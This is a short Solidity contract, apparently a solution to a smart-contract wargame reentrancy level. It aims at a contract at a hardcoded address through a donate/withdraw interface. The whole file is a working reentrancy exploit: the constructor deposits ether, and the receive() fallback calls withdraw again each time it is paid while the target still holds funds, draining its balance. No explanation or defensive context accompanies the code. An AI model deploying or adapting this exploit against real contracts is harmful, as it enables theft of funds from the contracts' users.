// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Cow {
  function balanceOf(address _who) external view returns (uint balance);
  function donate(address _to) external payable;
  function withdraw(uint _amount) external;
}

contract Milk {

  address TARGET = 0x57Ef225bad7c5CEa0D4380b24C998971c43dF51E;

  constructor() payable {
    Cow(TARGET).donate{value:msg.value}(address(this));
  }

  receive() external payable {
    if (TARGET.balance > 0) {
      Cow(TARGET).withdraw(msg.value);
    }
  }
}
